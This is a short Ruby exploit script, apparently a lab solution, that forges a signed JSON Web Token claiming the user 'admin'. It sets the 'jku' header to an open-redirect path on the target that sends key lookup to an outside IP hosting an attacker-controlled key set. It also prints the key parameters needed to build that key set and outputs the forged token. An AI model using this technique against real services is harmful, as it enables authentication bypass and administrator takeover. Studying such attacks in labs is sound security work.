
header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-feb9b714765e-45c3aa58cca2.libcurl.me/.well-known/../redirect?redirect_uri=http://3.137.170.110/jwks.json"}
#header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-feb9b714765e-45c3aa58cca2.libcurl.me/.well-known//jwks.json"}
body = {"user":"admin"}

require 'json'
require 'base64'
require 'openssl'

k = OpenSSL::PKey::RSA.new File.read "private.pem"

pub = k.public_key

puts Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)
puts Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)
data = Base64.urlsafe_encode64(header.to_json, padding: false)+"."+Base64.urlsafe_encode64(body.to_json, padding: false)
signature = k.sign("SHA256", data)
puts data+"."+Base64.urlsafe_encode64(signature, padding: false)
token = data+"."+Base64.urlsafe_encode64(signature, padding: false)
